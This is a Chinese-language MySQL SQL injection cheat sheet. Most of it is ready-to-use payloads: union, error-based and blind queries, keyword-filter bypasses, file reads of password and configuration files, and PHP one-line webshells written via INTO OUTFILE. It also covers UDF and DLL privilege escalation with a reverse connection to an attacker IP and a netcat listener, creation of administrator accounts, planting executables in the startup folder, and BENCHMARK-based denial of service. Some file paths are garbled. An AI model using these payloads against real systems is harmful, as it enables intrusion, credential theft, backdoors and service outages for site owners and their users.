# mysql注入
1. 先 '  看能不能报错  爆出物理路径    /* 试试  没有报错，说明是mysql数据库

2. mysql 4.0以下的版本不支持联合查询
  and ord(mid(version(),1,1))>51/*   返回结果正常说明mysql版为4且大于3   正常
   /*!50000%20s*/ 报错
   /*!60000%20s*/ 正常               说明mysql版本是大于5而小于6的
   
3. and ord(mid(user(),1,1))=114/*    返回正常，则可以初步判断数据库为root权限
   and (select count(*) from mysql.user)>0/* 正常，说明可以使用load_file()函数来读取文件

4. order by 10/*   
   and 1=2 union select 1,2,3,4,5,6,7,8,9,10/*


## mysql 注入（select）

mysql版本4.0只能靠猜
mysql版本5  靠 虚库information_schema爆库  表  字段
load_file()函数读数据
dumpfile/outfile导出shell
magic_quotes_gpc为on时需 16 进制

### 1.注释符   -- '不算
 '#'
 '/*'
 '-- -'
 '%23'
### 2.过滤空格注入
  过滤空格的时候 使用/**/或()或+代替空格
 %0c = form feed, new page
 %09 = horizontal tab
 %0d = carriage return
 %0a = line feed, new line


### 3.多条数据显示
 concat()
 group_concat()
 concat_ws()

### 4.相关函数语句
 system_user() 系统用户名
 user() 用户名
 current_user 当前用户名
 session_user()连接数据库的用户名
 datadir() 数据存储目录
 database() 数据库名
 version() MYSQL数据库版本
 load_file() MYSQL读取本地文件的函数
 @@datadir 读取数据库路径
 @@basedir MYSQL 安装路径
 @@version_compile_os 操作系统 Windows Server 2003
@@version
SHOW VARIABLES
select @@plugin_dir 
SHOW VARIABLES LIKE "%dir%";
concat()mysql4.1以上版本支持concat函数，拼接字段

###  5.mysql一般注入语句
转换成  数据库的16进制编码    的目的是绕过 “ ‘ 之类的过滤
只显示一个结果出来  limit 1,1    从编号1的开始显示一个    （0 ，1 ，2 ……） 
可以不要  limit 1,1   试试
#### 正常语句模式
 猜字段数，用二分法放大测试n
order by n/*
http://172.16.15.72/list.php?id=1 order by 4
查库名
and 1=2 union select 1,schema_name,3,4 from information_schema.schemata limit 1,1 -- -  /*
and 1=2 union select 1,group_concat(schema_name),3,4 from information_schema.schemata/*
example：
http://172.16.15.72/list.php?id=1 and 1=2 union select 1,schema_name,3,4 from information_schema.schemata limit 1,1
查询表名
and 1=2 union select 1,2,3,4,table_name from information_schema.tables where table_schema="inject_paodingjieniu" limit 1,1 -- -   /*    
and 1=2 union select 1,2,3,4,group_concat(table_name),5 from information_schema.tables where table_schema=数据库的16进制编码/*
example：
http://172.16.15.72/list.php?id=1 and 1=2 union select 1,2,table_name,5 from information_schema.tables where table_schema="cimer" limit 0,1
查询字段
and 1=2 union select 1,2,3,column_name  from information_schema.columns where table_name="key_the1" and table_schema="inject_paodingjieniu2" limit 1,1 -- - /*
and 1=2 union select 1,2,4,group_concat(column_name),5,6,7 from information_schema.columns where table_name=表名的十六进制编码 and table_schema=数据库的16进制编码/*
example：
http://172.16.15.72/list.php?id=1 and 1=2 union select 1,2,column_name,4 from information_schema.columns where table_name="admin" and table_schema="cimer" limit 1,1
查询内容
and 1=2 union select 1,2,3,thekey from inject_paodingjieniu2.key_the1 -- -   /*
example：
http://172.16.15.72/list.php?id=1 and 1=2 union select 1,username,password,4 from cimer.admin
#### 过滤sql关键字的情况    
 双写，大小写，注释，拼接
 猜字段数，用二分法放大测试n
    order by n-- -
库名
    aandnd 1=2 ununionion selselectect 1,schema_name,3,4 from infoorrmation_schema.schemata limit 1,1 -- -
    aandnd 1=2 ununionion seselectlect 1,group_concat(schema_name),3,4 from information_schema.schemata-- -
查询表名
    aandnd 1=2 ununionion selselectect 1,2,table_name,5 from infoorrmation_schema.tables where table_schema="inject_xsnd" limit 1,1 -- -
    aandnd 1=2 ununionion selselectect 1,2,,group_concat(table_name),5 from information_schema.tables where table_schema=数据库的16进制编码-- -
查询字段
    anandd 1=2 uniunionon selselectect 1,2,column_name,5, from infoorrmation_schema.columns where table_name="key_05" aandnd         table_schema="inject_xsnd" limit 1,1 -- -
    aandnd 1=2 uniunionon selselectect 1,2,group_concat(column_name),5 from information_schema.columns where table_name=表名的十六进制编码 and table_schema=数据库的16进制编码-- -
查询内容
    aandnd 1=2 uniunionon selselectect 1,2,3,thekey,5 from inject_xsnd.key_05 -- -

###  6.mysql读取写入文件
必备条件：
读：file权限必备
写：1.绝对路径 2.union使用 3. 可以使用'' 
#### 读 
 mysql3.x读取方法
    create table a(cmd text);
    load data infile 'c:\\xxx\\xxx\\xxx.txt' into table a;
    select * from a;
 mysql4.x读取方法
    除上述方法还可以使用load_file()
    create table a(cmd text);
    insert into a(cmd) values(load_file('c:\\ddd\\ddd\\ddd.txt'));
    select * from a;
 mysql5.x读取方法
    上述两种都可以
 读取文件技巧：
    load_file(char(32,26,56,66))
    load_file(0x633A5C626F6F742E696E69)

load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录

and (select count(*) from mysql.user)>0/* 正常，说明可以使用load_file()  或者 load data infile 读取文件 函数来读取文件

Substring(load_file(A),50,100)就是把 A的内容的第50个字母开始回显100个给你.那么就能逐段逐段的回显啦.

转成16进制
id=123 union select 1,2,3,load_file(0x633A5C626F6F742E696E69),5,6,7,8,9,10/*

或10进制
id=123 union select 1,2,3,
load_file(char(99,58,92,98,111,111,116,46,105,110,105)),5,6,7,8,9,10/*

查看一个PHP文件里完全显示代码,有些时候不替换一些字符,如 "<" 替换成"空格" 返回的是网页.而无法查看到代码.
replace(load_file(0x2F6574632F706173737764),0x3c,0x20)
replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))
网站常用配置文件 config.inc.php、config.php。load_file（）时要用replace（load_file(HEX)，char(60),char(32)）//Char(60)表示 <    Char（32）表示 空格
load_file读二进制的时候  需要  转 hex（load_file('xxxxxx')）
load_file()的作用还可以用来读取系统中的二进制文件，
c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码
c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此
c:\Program Files\RhinoSoft.com\ServUDaemon.exe
C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件   //存储了pcAnywhere的登陆密码

load_file() 常用路径：
　　1、 replace(load_file(0×2F6574632F706173737764),0×3c,0×20)
　　2、replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))
　　上面两个是查看一个PHP文件里完全显示代码.有些时候不替换一些字符,如 “<” 替换成”空格” 返回的是网页.而无法查看到代码.
　　3、 load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录
　　4、/etc tpd/conf tpd.conf或/usr/local/apche/conf tpd.conf 查看linux APACHE虚拟主机配置文件
　　5、c:Program FilesApache GroupApacheconf httpd.conf 或C:apacheconf httpd.conf 查看WINDOWS系统apache文件
　　6、c:/Resin-3.0.14/conf/resin.conf 查看jsp开发的网站 resin文件配置信息.
　　7、c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机
　　8、d:APACHEApache2confhttpd.conf
　　9、C:Program Filesmysqlmy.ini
　　10、../themes/darkblue_orange/layout.inc.php phpmyadmin 爆路径
　　11、 c:windowssystem32inetsrvMetaBase.xml 查看IIS的虚拟主机配置文件
　　12、 /usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看
　　13、 /usr/local/resin-pro-3.0.22/conf/resin.conf 同上
　　14 、/usr/local/app/apache2/conf/extra tpd-vhosts.conf APASHE虚拟主机查看
　　15、 /etc/sysconfig/iptables 本看防火墙策略
　　16 、 usr/local/app/php5 b/php.ini PHP 的相当设置
　　17 、/etc/my.cnf MYSQL的配置文件
　　18、 /etc/redhat-release 红帽子的系统版本
　　        /etc/profile 单独只有tomcat 的配置
　　19 、C:mysqldatamysqluser.MYD 存在MYSQL系统中的用户密码
　　20、/etc/sysconfig/network-scripts/ifcfg-eth0 查看IP.
　　21、/usr/local/app/php5 b/php.ini //PHP相关设置
　　22、/usr/local/app/apache2/conf/extra tpd-vhosts.conf //虚拟网站设置
　　23、C:Program FilesRhinoSoft.comServ-UServUDaemon.ini
　　24、c:windowsmy.ini
　　25、c:boot.ini

#### 写
MYSQL INTO OUTFILE下写入PHPSHELL？
条件：
1.知道物理路径(into outfile '物理路径')
2.能够使用union (MYSQL3以上的版本)
3.对方没有对’进行过滤

判断是否具有读写权限
and (select count(*) from mysql.user)>0/*
and (select count(file_priv) from mysql.user)>0/*
and (select count(*) from mysql.user)>0/* 如果结果返回正常,说明具有读写权限。

 into outfile写文件
    union select 1,2,3,char(这里写入你转换成10进制或16进制的一句话木马代码),5,6,7,8,9,10,7 into outfile 'd:\web\90team.php'/*
    union select 1,2,3,load_file('d:\web\logo123.jpg'),5,6,7,8,9,10,7 into outfile 'd:\web\90team.php'/*
example：
select '<?php eva l($_POST[cmd]);?>' into outfile 'F:/web/bak.php';
id=123 union select 1,2,3,char(这里写入你转换成10进制或16进制的一句话木马代码),5,6,7,8,9,10,7 into outfile 'd:\web\90team.php'/*

0x203C3F706870206576616C28245F504F53545B315D293B3F3E =  <?php eval($_POST[1]);?>
select  concat(0x203C3F706870206576616C28245F504F53545B315D293B3F3E) into dumpfile '网站的物理路径'

执行赋权改密码语句：
 GRANT ALL PRIVILEGES ON *.*  TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;


##  mysql 注入 insert、update 

mysql一般请求mysql_query不支持多语句执行，mysqli可以。 

### insert注入    多使用报错注入！
1.如果可以直接插入管理员可以直接使用！
insert into user(username,password) values('xxxx',' xxxx'),('dddd','dddd')/* ');
2.如果可以插入一些数据，这些数据会在网页中显示，我们可以结合xxs和csrf来获取cookies或getshell
insert into table(column,column) values('xxs',' csrf'),('csrf','dddd')/* ');

演示语句
inserti.php?id=test1,(SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(SELECT version()))a from information_schema.tables group by a)b))%23
空间留言: 
cccccc',(select concat(userid,0x3a,pwd) from #@__admin limit 0,1),'','','','123',123)# 

insert类型的注入可以延迟注射和mysql显错注射的

其实就是利用sql语句执行的先后顺序，在update或insert的时候，数据库引擎先计算set yyyy=XXXX XXXX后的值，然后再将该值插入到 yyyy里去。
比如insert into whoami set id=1 xor(select 1);  //会正常的执行，并且会做异或运算 根据上边说过的执行顺序 1xor 1 =0 所以为flase 语句并没有插入。

insert into whoami set id=1 xor(select 0);  1 xor 0 =1 为true 所以插入了id为1的列。因此我们可以利用mysql爆错语句来得到我们想要的内容。
给两个爆错语句
and exists(select * from ( select * from (select name_const(version(),0) )a join (select name_const(version(),0) )b )c )
and (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(SELECT version()))a from information_schema.tables group by a)b)

### update注入同上

### mysql报错注入
#### 实例
SELECT  报错查询
mysql> select * from users where id = 1 and exp(~(select*from(select user())a));
        1690 - DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
INSERT 报错
mysql> insert into users (id,user) values(1,'c4' | exp(~(select*from(select user())x)));
        1690 - DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
UPDATE 报错
mysql> update users set  user="test" | exp(~(select*from(select user())x)) where id=1;
        1690 - DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
DELETE 报错
mysql> delete from users where id=1 | exp(~(select*from(select user())x));
        1690 - DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
#### 模板：
语句处填入一般一句，如：SELECT distinct concat(0x7e,0x27,schema_name,0x27,0x7e) FROM information_schema.schemata LIMIT 0,1
1.
and(select 1 from(select count(*),concat((select (select (语句)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1

2. 
and+1=(select+*+from+(select+NAME_CONST((语句),1),NAME_CONST((语句),1))+as+x)--

3.
update web_ids set host='www.0x50sec.org' where id =1 aNd (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(substring((Select (语句)),1,62)))a from information_schema.tables group by a)b);

4.
insert into web_ids(host) values((select (1) from mysql.user where 1=1 aNd (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(substring((Select (语句)),1,62)))a from information_schema.tables group by a)b)));

mysql手工注入之高级报错注入
查看版本mysql版本
and+exists(select*from+(select*from(select+name_const(@@version,0))a+join+(select+name_const(@@version,0))b)c) 
爆所有库
and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,schema_name,0x27,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
爆当前数据库
and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,hex(cast(database() as char)),0x27,0x7e)) from
information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
爆表
and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,hex(cast(table_name as char)),0x27,0x7e) from information_schema.tables where table_schema=hex库名 limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
爆字段
and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from information_schema.columns where table_schema=库名 and table_name=表名 limit 0,1)) from
information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
爆内容
and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,表名.字段,0x27,0x7e) from 表名 limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1

#### select暴错示例
第一种
1 and (select 1 from(select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);

mysql> select * from users where id=1 and (select 1 from(select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
     1062 - Duplicate entry 'root@localhost1' for key 'group_key'

第二种
1 and extractvalue(1,concat(0x5c,(select user())))
extractvalue(rand(0),concat(0x0a,version()))
extractvalue(floor(0),concat(0x0a,version()))
extractvalue(rand(0),concat(0x0a,unhex(hex(user()))))
extractvalue(floor(0),concat(0x0a,unhex(hex(user()))))
extractvalue(rand(0),convert(user() using latin1))

mysql> select * from users where id=1 and extractvalue(1,concat(0x5c,(select user())));
    1105 - XPATH syntax error: '\root@localhost'

第三种
1 and (updatexml(1,concat(1,(select user()),1),1));
updatexml(1,repeat(user(),2),1)
updatexml(0,concat(0xa,user()),0)
updatexml(0,lpad(.1,350,hex(hex(user()))),1)
updatexml(1,concat('/',user()),1)

mysql> select * from users where id=1 and (updatexml(1,concat(1,(select user()),1),1));
    1105 - XPATH syntax error: 'root@localhost1'

第四种
1 and geometrycollection((select * from(select * from(select user())a)b));

mysql> select * from users where id=1 and geometrycollection((select * from(select * from(select user())a)b));
    1367 - Illegal non geometric '(select `b`.`user()` from (select 'root@localhost' AS `user()` from dual) `b`)' value found during parsing

第五种
1 and polygon((select * from(select * from(select user())a)b))

mysql> select * from users where id=1 and polygon((select * from(select * from(select user())a)b));
     1367 - Illegal non geometric '(select `b`.`user()` from (select 'root@localhost' AS `user()` from dual) `b`)' value found during parsing

第六种
1 and multipoint((select * from(select * from(select user())a)b));

mysql> select * from users where id=1 and multipoint((select * from(select * from(select user())a)b));
    1367 - Illegal non geometric '(select `b`.`user()` from (select 'root@localhost' AS `user()` from dual) `b`)' value found during parsing

第七种
1 and multilinestring((select * from(select * from(select user())a)b));

mysql> select * from users where id=1 and multilinestring((select * from(select * from(select user())a)b));
     1367 - Illegal non geometric '(select `b`.`user()` from (select 'root@localhost' AS `user()` from dual) `b`)' value found during parsing

第八种
1 and multipolygon((select * from(select * from(select user())a)b));

mysql> select * from users where id=1 and multipolygon((select * from(select * from(select user())a)b));
    1367 - Illegal non geometric '(select `b`.`user()` from (select 'root@localhost' AS `user()` from dual) `b`)' value found during parsing

第九种
1 and linestring((select * from(select * from(select user())a)b));

mysql> select * from users where id=1 and linestring((select * from(select * from(select user())a)b));
    1367 - Illegal non geometric '(select `b`.`user()` from (select 'root@localhost' AS `user()` from dual) `b`)' value found during parsing

第10种
1 and exp(~(select*from(select user())a));

mysql> select * from users where id = 1 and exp(~(select*from(select user())a));
    1690 - DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'

mysql> select * from users where id = 1 or exp(~(select*from(select user())a));
    1690 - DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'

mysql> select * from users where id = 1 && exp(~(select*from(select user())a));
    1690 - DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'

mysql> select * from users where id = 1 | exp(~(select*from(select user())a));
    1690 - DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'

mysql> select * from users where id = 1 || exp(~(select*from(select user())a));
    1690 - DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'

mysql> select * from users where id = 1 & exp(~(select*from(select user())a));
    1690 - DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'

mysql> select * from users where id = 1 ^ exp(~(select*from(select user())a));
    1690 - DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
#### example：
读取数据库
select exp(~(select*from(select group_concat(schema_name) from information_schema.schemata)x));
读取表名
select exp(~(select*from(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1)x));
读取列名
select exp(~(select*from(select group_concat(column_name) from information_schema.columns where table_name='表名' limit 0,1)x));
读取键值内容
select exp(~(select*from(select concat(key1,0x7c，key2) from users limit 0,1)x));
select exp(~(select*from(select concat_ws(key1,0x7c，key2) from users limit 0,1)x));
select exp(~(select*from(select gruop_concat(key1,0x7c，key2) from users limit 0,1)x));

## mysql盲注
### 盲注涉及的函数：
sleep()
 mid()函数
 left()
 substr ()
 regexp "[a-z]"   正则表达式盲注
### mysql一般盲注
使用ascii
AND ascii(substring((SELECT password FROM users where id=1),1,1))=49
使用正则表达式
and 1=(SELECT 1 FROM information_schema.tables where table_schema="blind_sqli" and table_name regexp '^[a-n]' limit 0,1)

### mysql时间盲注

1170 union select if(substring(current,1,1)=char(11),benchmark(5000000,encode('msg','by 5 seconds')),null) from (select database() as current) as tbl

UNION SELECT IF(SUBSTRING(Password,1,1)='a',BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User ='root'

## mysql其他注入技巧


Substring(load_file(A),50,100)就是把 A的内容的第50个字母开始回显100个给你.那么就能逐段逐段的回显啦.

读 默认user库里面的用户密码
union all select 1,concat(user,0×3a,password),3,4,5,6,7,8,9,10 from mysql.user/*

编码转换
id=2%20and%201=2%20union%20select%201,hex(version()),3,4,5,6%20/*

判断有没有写权限
and (select count(*) from MySQL.user)>0-- 
返回错误，没有写权限

limit 从0开始递增，查询到3时浏览器返回错误，说明存在2个库。
and 1=2 union select 1,SCHEMA_NAME,3,4,5,6,7,8  from information_schema.SCHEMATA limit 1,1/*

可以把当前用户中建立数据库名全部显示出来
and 1=2 union select 1,group_concat(schema_name),3,4 from information_schema.schemata

土耳其黑客的手法,查出所有数据库
and+1=0+union+select+concat(0x5B78786F6F5D,GROUP_CONCAT(DISTINCT+table_schema),0x5B78786F6F5D),-3,-3,-3,-3,-3,-3,-3,-3+from+information_schema.columns--

and 0<>(select count(*) from admin)   正常  说明存在admin这张表
and 0<>(select count(username) from admin)   返回正常，存在username这个字段
常用的表名有：user/s,admin/s,member/s…
常用的列名有：username,user,usr,user_name,password,pass,passwrd,passwd,pwd…


假如网站可以上传图片，可以将木马改成图片的格式上传，找出图片的绝对路径在通过into outfile导出为PHP文件。
代码：
id=123 union select 1,2,3,load_file(d:\web\logo123.jpg),5,6,7,8,9,10,7 into outfile 'd:\web\90team.php'/*
id=xxx and 1=2 union select 1,2,3,unhex(mm.exe的十六进制),5 INTO DUMPFILE 'C:\\Documents and Settings\\All Users\\「开始」菜单\程序\启动\\mm.exe'/* 

收集的一些路径：
WINDOWS下:
c:/boot.ini          //查看系统版本
c:/windows/php.ini   //php配置信息
c:/windows/my.ini    //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码
c:/winnt/php.ini     
c:/winnt/my.ini
c:\mysql\data\mysql\user.MYD  //存储了mysql.user表中的数据库连接密码
c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini  //存储了虚拟主机网站路径和密码
c:\Program Files\Serv-U\ServUDaemon.ini
c:\windows\system32\inetsrv\MetaBase.xml  //IIS配置文件
c:\windows\repair\sam  //存储了WINDOWS系统初次安装的密码
c:\Program Files\ Serv-U\ServUAdmin.exe  //6.0版本以前的serv-u管理员密码存储于此
c:\Program Files\RhinoSoft.com\ServUDaemon.exe
C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件
//存储了pcAnywhere的登陆密码
c:\Program Files\Apache Group\Apache\conf \httpd.conf 或C:\apache\conf \httpd.conf //查看     WINDOWS系统apache文件
c:/Resin-3.0.14/conf/resin.conf   //查看jsp开发的网站 resin文件配置信息.
c:/Resin/conf/resin.conf      /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机
d:\APACHE\Apache2\conf\httpd.conf
C:\Program Files\mysql\my.ini
c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置
C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码

LUNIX/UNIX下:
/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件
/usr/local/apache2/conf/httpd.conf
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
/usr/local/app/php5/lib/php.ini //PHP相关设置
/etc/sysconfig/iptables //从中得到防火墙规则策略
/etc/httpd/conf/httpd.conf // apache配置文件
/etc/rsyncd.conf //同步程序配置文件
/etc/my.cnf //mysql的配置文件
/etc/redhat-release //系统版本
/etc/issue
/etc/issue.net
/usr/local/app/php5/lib/php.ini //PHP相关设置
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件
/usr/local/resin-3.0.22/conf/resin.conf  针对3.0.22的RESIN配置文件查看
/usr/local/resin-pro-3.0.22/conf/resin.conf 同上
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看
/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件
/usr/local/resin-3.0.22/conf/resin.conf  针对3.0.22的RESIN配置文件查看
/usr/local/resin-pro-3.0.22/conf/resin.conf 同上
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看
/etc/sysconfig/iptables 查看防火墙策略

常用的配置文件路径如下
Linux
/etc/passwd
/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件
/usr/local/apache2/conf/httpd.conf
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
/usr/local/app/php5/lib/php.ini //PHP相关设置
/etc/sysconfig/iptables //从中得到防火墙规则策略
/etc/httpd/conf/httpd.conf // apache配置文件
/etc/rsyncd.conf //同步程序配置文件
/etc/sysconfig/network-scripts/ifcfg-eth0 //查看IP.
/etc/my.cnf //mysql的配置文件
/etc/redhat-release //系统版本

Windows 
c:\boot.ini //windows系统特有的配置文件
c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码
c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码
c:\Program Files\Serv-U\ServUDaemon.ini
c:\windows\my.ini //MYSQL配置文件
c:\windows\system32\inetsrv\MetaBase.xml //IIS配置文件

sp+access 偏移注入
order by 12得出有12列
最后一位用*代替，直到回显正常，到1,2,3,4,5,6,7,8，*后回显正常，则12-2*4=4，所以剩4列，如下偏移注入
and 1=2 union select 1,2,3,4,5,6,7,8,admin* from admin 于是在第9,10,11,12位显示admin表的内容，但如果这四位不回显，继续偏移
and 1=2 union select 1,2,3，admin.*,8,9,10,11,12
或者构建虚拟表a,b 将不同的表合在一个表里显示
and 1=2 union select 1,2,3,4,a.id,b.id,* from (admin as a inner join admin as b on a.id=b.id)
得到admin用户名，继续偏移注入，and 1=2 union select 1,2,3,4,* from (admin as a inner join admin as b on a.id=b.id)
注入时如果，被过滤，使用如下语句，首先order by 出4列，于是' union select * from ((select 1)a join (select 2)b join (select 3)c join (select 4) join) 

## mysql数据库版本特性
1. mysql5.0以后  information.schema库出现
 系统数据库  information_schema
    tables里存放所有表名    
    columns里存放所有列名
    schemata里存放所有数据库名
2. mysql5.1以后 udf 导入xx\lib\plugin\ 目录下
3. mysql5.x以后 system执行命令
phpmyadmin 后台拿webshell


phpmyadmin爆路径方法:
weburl+phpmyadmin/themes/darkblue_orange/layout.inc.php
http://url/phpmyadmin/libraries/select_lang.lib.php 
pphpmyadmin/libraries/export/xls.php 
hpmyadmin\themes\darkblue_orange\layout.inc.php 

D:\usr\www\html\phpMyAdmin\
----start code---
Create TABLE a (cmd text NOT NULL);
Insert INTO a (cmd) VALUES('<?php @eval($_POST[cmd])?>');
select cmd from a into outfile 'D:/usr/www/html/phpMyAdmin/d.php';
Drop TABLE IF EXISTS a;
----end code---

mix.dll提权
D:/usr/www/html/mix.dll
mysql -h 目标ip -uroot -p
\. c:\mysql.txt
select Mixconnect('反弹ip','端口');
nc -vv -l -p 1983

udf.dll提权
create function cmdshell returns string soname 'udf.dll'
select cmdshell('net user user password /add'); 
select cmdshell('net localgroup administrators user /add'); 
select cmdshell('c:\3389.exe'); 
drop function cmdshell;  删除函数
select cmdshell('netstat -an');

利用BENCHMARK函数进行ddos攻击，　思路很简单
    在BENCHMARK(count,expr) 中 我们只要设置count 就是执行次数足够大的话，就可以造成dos攻击了，如果我们用代理或其他同时提交，就是ddos攻击，估计数据库很快就会挂了。不过前提还是要求可以注射。语句：
    http://127.0.0.1/test/test/show.php?id=1%20union%20select%201,1,benchmark(99999999,md5(0x41))
    myadmin下
        select 1 from mysql.host where char(97)<benchmark(99999999,benchmark(99999999,sha1('t')))
## mysql下读取文件
### mysql3.x下
不确定mysql3.x下能否使用load_file()函数（我在mysql3使用手册上没有查到，但貌似是可以的），用 load data infile 读取文件，命令如下
```
mysql>create table a (cmd text);
mysql>load data infile 'c:\\boot.ini' into table a;
mysql>select * from a;
```
### mysql4.x下
mysql4.x下除了 load data infile 外还可以用大家熟知的 load_file() 来读取，命令如下
```
mysql>create table a (cmd text);
mysql>insert into a (cmd) values (load_file('c:\\boot.ini'));
mysql>select * from a;
```
### mysql5.x下
在linux下，mysql5.x 除了上面两种方法，还可以利用 system 直接执行系统命令的方式来读取文件（是否必须root身份不确定，未测试），命令如下
mysql>system cat /etc/passwd
mysql下读取文件在入侵中用到的时候不多，可能用于查询配置文件寻找web路径，或者webshell权限很小的时候读取其他格式的webshell内容然后用into outfile方式写入大马等，二进制文件也可以这样用，只是多了hex()和unhex()的工序。

例：把免杀过的udf.dll文件插入系统目录
```
create table a (cmd LONGBLOB);
insert into a (cmd) values (hex(load_file('c:\\windows\\temp\\udf.dll')));
SELECT unhex(cmd) FROM a INTO DUMPFILE 'c:\\windows\\system32\\udf.dll';
```
其他的利用方法也很多，如把木马文件写入启动项，或者把加工过的cmd.exe文件导出到系统根目录下，把sam备份导出到可读目录等等，注入中理论上应该也可以这样用(在不知道web路径又可以导出文件的情况下)，大家自由发挥吧。

注入中的语法 id=xxx and 1=2 union select 1,2,3,unhex(mm.exe的十六进制),5 INTO DUMPFILE 'C:/Documents and Settings/All Users/「开始」菜单/程序/启动/mm.exe'/* 
测试后发现注入中运用不太现实,因为要导出二进制文件要求必须数据类型为blob或longblob，现实中极少用到。

## 过滤和绕过
### 绕过过滤
#### 编码处理-
    关于编码问题在google中实在是搜的是数不胜数，不过编码也有很多，这里就简单的说下常用的几种吧：
    1)Urlencode 这个编码很常见了吧，如%31%3d%31，不过在绕过防注入中效果确实不太好，除非服务器只是对浏览器中的url地址进行了判断
    2)ASCII 这个一般情况下用的稍微多点，char(xxx)大家都应该非常熟悉，里面加上相应的ascii码并用+连接多个就可以了
    3)Hex 一个非常经典的绕过技术，不过由于mssql没有像mysql提供unhex()这样的函数，所以使用上要求语句须支持分句，将其定义后然后赋值就可以使用了

#### 语句变换-
    实现某个功能我们可以通过不同的语句来实现，其中一种可能就有适合当前环境下的语句，看看下面的sql语句吧，同时也是我在注入过程中经常用到的
    select password from users
    convert(int,select password from users)
    这样就可能让我们获取到密码。不要着急，这只是一个变换句子的例子，现在我们来看看如果在防注入了过滤了某些查询的关键字怎么办呢？
    select password from users 由于过滤了password无法执行
    declare @pw varchar(1000) set @pw=0×70617373776F7264; select @pw form users; 这样通过对特别字符进行hex处理就能绕过，主要应对比较特别的情况，如IDS之类的安全设备，配合其他方式绕过防注入也是非常不错的

#### 其他-
 除此之外，我们还可以通过一些比较特别的方法来绕过，如in、between等等，例如过滤了select，看下面
 select password from users 过滤select，无法执行
 s%e%l%e%c%t password from users 通过%连接
 “sel”+”ect” password from users 通过+来连接
 select password from users 通过来连接
    其次，在一些防注入中由于脚本没有过滤cookie提交，由此我们可以通过cookie来进行注入，其实方法真的很多，想上次‘的过来问题最终也是通过语句变换的方式解决了，sql语句的灵活运行在某些时候真的很暴力，欢迎各位就以上几点进行探讨。

 变态的绕过方法，/*!select*/，把容易被过滤的东西放到/*!XXX*/中，一样可以正常查询，也就是/*!select*/=select。如果你还不放心那就这样/*!sEleCt*/，呵呵。这个/*!XXX*/=XXX的原理我还不清楚，而且是完全想不通


